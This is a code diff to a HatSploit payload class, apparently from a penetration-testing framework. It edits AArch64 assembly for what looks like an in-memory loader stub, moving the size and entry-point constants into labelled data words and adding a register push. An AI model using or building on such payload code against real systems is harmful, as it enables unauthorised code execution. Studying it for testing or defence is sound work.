@@ -40,7 +40,7 @@ class HatSploitPayload(Payload, Handler):
         return self.__asm__(
             f"""
             start:
-                adr x2, {hex(length)}
+                adr x2, size
                 ldr w2, [x2]
                 mov x10, x2
 
@@ -73,7 +73,7 @@ class HatSploitPayload(Payload, Handler):
                 subs x4, x4, x0
                 bne loop
 
-                adr x0, {hex(entry)}
+                adr x0, entry
                 ldr x0, [x0]
                 add x0, x0, x10
                 mov x14, x0
@@ -106,6 +106,7 @@ class HatSploitPayload(Payload, Handler):
                 stp x6, x7, [sp, -16]!
                 stp x4, x5, [sp, -16]!
                 stp x2, x3, [sp, -16]!
+                stp x0, x1, [sp, -16]!
 
                 mov x29, 0
                 mov x30, 0
@@ -115,6 +116,12 @@ class HatSploitPayload(Payload, Handler):
                 mov x0, 0
                 mov x8, 0x5d
                 svc 0
+
+            size:
+                .word {hex(length)}
+
+            entry:
+                .word {hex(entry)}
             """
         )
 
